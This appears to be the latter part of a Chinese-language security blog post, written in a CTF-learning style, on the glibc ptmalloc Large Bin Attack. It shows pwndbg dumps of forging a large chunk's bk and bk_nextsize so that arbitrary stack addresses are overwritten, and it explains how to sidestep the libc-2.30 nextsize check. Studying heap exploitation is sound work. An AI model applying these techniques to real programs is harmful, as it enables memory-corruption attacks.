+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a0a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a0a0</span></span><br><span class="line">    <span class="comment">/* p1(分割后) -&gt; main_arena */</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x500</span>: <span class="number">0x55555555a360</span> —▸ <span class="number">0x7ffff7dd1fa8</span> (main_arena+<span class="number">1160</span>) ◂— <span class="number">0x55555555a360</span></span><br><span class="line">    <span class="comment">/* 遍历到p1时就满足了分割的条件(从后往前),所以p1被分割,p2则放入了largebins */</span></span><br></pre></td></tr></table></figure>
+<p>接下来释放p3，然后修改p2：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a8a0</span> —▸ <span class="number">0x55555555a0a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a8a0</span></span><br><span class="line">    <span class="comment">/* p3 -&gt; p1(分割后) -&gt; main_arena */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改前：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a360</span></span><br><span class="line"><span class="number">0x55555555a360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x55555555a370</span>:	<span class="number">0x00007ffff7dd1fa8</span>	<span class="number">0x00007ffff7dd1fa8</span></span><br><span class="line"><span class="number">0x55555555a380</span>:	<span class="number">0x000055555555a360</span>	<span class="number">0x000055555555a360</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdf10</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdf18</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改后：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a360</span></span><br><span class="line"><span class="number">0x55555555a360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x55555555a370</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdf00</span> <span class="comment">// stack_var1 - 2</span></span><br><span class="line"><span class="number">0x55555555a380</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdef8</span> <span class="comment">// stack_var2 - 4</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdf10</span> —▸ <span class="number">0x55555555a8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdf18</span> —▸ <span class="number">0x55555555a8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack_var1 (<span class="number">0x7fffffffdf10</span>): <span class="number">0x55555555a8a0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdf18</span>): <span class="number">0x55555555a8a0</span></span><br></pre></td></tr></table></figure>
+<p>成功在“stack_var1”和“stack_var2”中写入了“p3”的地址，这就是利用了以下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">bck-&gt;fd = victim; <span class="comment">/* bck 也就是 fwd-&gt;bk */</span></span><br></pre></td></tr></table></figure>
+<p>在“p2”覆盖完毕后，再次申请内存空间的过程中：</p>
+<ul>
+<li>p3会被写入largebin，它的结构如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555b8a0</span></span><br><span class="line"><span class="number">0x55555555b8a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x55555555b8b0</span>:	<span class="number">0x000055555555b360</span>	<span class="number">0x00007fffffffdf00</span> </span><br><span class="line">	<span class="comment">/* FD = p2			BK = stack_var1-2 */</span></span><br><span class="line"><span class="number">0x55555555b8c0</span>:	<span class="number">0x000055555555b360</span>	<span class="number">0x00007fffffffdef8</span></span><br><span class="line">	<span class="comment">/* fd_nextsize = p2			bk_nextsize = stack_var2-4 */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>在前面操作中，p2的size被修改，使得p3成为新的纵向列表头</li>
+<li>因为 “p3-&gt;size” 大于 “p2-&gt;size”，所以p3将插入p2前面</li>
+<li>下面的代码都是将解释p3进入largebin后的结构：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck <span class="comment">/* fwd初始化为原链表头 */</span></span><br><span class="line">fwd = fwd-&gt;fd_nextsize <span class="comment">/* 遍历链表寻找合适的fwd,最后找到fwd=p2(p2已经被伪造) */</span></span><br><span class="line"><span class="comment">/* fwd = p2 */</span></span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk <span class="comment">/* 这里的fwd就是p2,而fwd-&gt;bk则是&quot;stack_var1-2&quot; */</span></span><br><span class="line"><span class="comment">/* bck = stack_var1-2 */</span></span><br><span class="line">    </span><br><span class="line">victim-&gt;bk = bck <span class="comment">/* bk = stack_var1 - 2 */</span></span><br><span class="line">victim-&gt;fd = fwd <span class="comment">/* fd = p2 */</span></span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize <span class="comment">/* bk_nextsize = stack_var2 - 4 */</span></span><br><span class="line">victim-&gt;fd_nextsize = fwd <span class="comment">/* fd_nextsize = p2 */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后解释一下“stack_var1”和“stack_var2”被修改的原因：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fwd = p2 */</span></span><br><span class="line"><span class="comment">/* bck = stack_var1-2 */</span></span><br><span class="line"></span><br><span class="line">fwd-&gt;bk_nextsize = victim <span class="comment">/* p2-&gt;bk_nextsize=victim */</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim <span class="comment">/* (stack_var2-4)-&gt;fd_nextsize=victim */</span></span><br><span class="line">fwd-&gt;bk = victim <span class="comment">/* p2-&gt;bk=victim */</span></span><br><span class="line">bck-&gt;fd = victim <span class="comment">/* (stack_var1-2)-&gt;fd=victim */</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdef8</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2-4</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ r8  <span class="number">0x7fffffffdf00</span> —▸ <span class="number">0x7fffffffdf40</span> —▸ <span class="number">0x555555555330</span> (__libc_csu_init) ◂— endbr64 <span class="comment">// stack_var1-2</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffdf08</span> —▸ <span class="number">0x5555555552c6</span> (main+<span class="number">316</span>) ◂— mov    rax, qword ptr [rbp - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rsp <span class="number">0x7fffffffdf10</span> —▸ <span class="number">0x55555555b8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffdf18</span> —▸ <span class="number">0x55555555b8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br><span class="line">    <span class="comment">/* (stack_var2-4)-&gt;fd_nextsize=stack_var2 */</span></span><br><span class="line">    <span class="comment">/* (stack_var1-2)-&gt;fd=stack_var1 */</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555b360</span> <span class="comment">/* p2 */</span></span><br><span class="line"><span class="number">0x55555555b360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x55555555b370</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055555555b8a0</span> <span class="comment">// p3</span></span><br><span class="line"><span class="number">0x55555555b380</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055555555b8a0</span> <span class="comment">// p3</span></span><br></pre></td></tr></table></figure>
+<h2 id="libc-2-30-的检测"><a href="#libc-2-30-的检测" class="headerlink" title="libc-2.30 的检测"></a>libc-2.30 的检测</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>在 glibc2.29 中，增加了对双向链表完整性的检查，这样的检查方式正如同 glibc2.29 中增加的对 unsorted bin 类似，但是与其不同的是，这个检查只存在于插入的 unsorted chunk size 大于 chunk 时候，也就是说， <strong>如果我们构造一个小于所有 largebin 中堆块的 unsorted chunk，那么就可以成功利用上面那个分支操作</strong> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size)</span><br><span class="line">    &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(chunk_main_arena(fwd));</span><br><span class="line">    <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        assert(chunk_main_arena(fwd));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size</span><br><span class="line">        == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(fwd))</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/ptmalloc/" rel="tag"><i class="fa fa-tag"></i> ptmalloc</a>
+              <a href="/tags/Largebin-attack/" rel="tag"><i class="fa fa-tag"></i> Largebin attack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/25/%E8%99%8E%E7%AC%A6ctf2022/" rel="prev" title="虎符ctf2022">
+      <i class="fa fa-chevron-left"></i> 虎符ctf2022
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/27/House%20Of%20Storm-%E5%8E%9F%E7%90%86/" rel="next" title="House Of Storm-原理">
+      House Of Storm-原理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin-Attack"><span class="nav-number">1.</span> <span class="nav-text">Ptmalloc算法：Largebin Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Large-bin"><span class="nav-number">2.</span> <span class="nav-text">Large bin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Large-Bin-Attack"><span class="nav-number">3.</span> <span class="nav-text">Large Bin Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#libc-2-30-%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="nav-number">4.</span> <span class="nav-text">libc-2.30 的检测</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
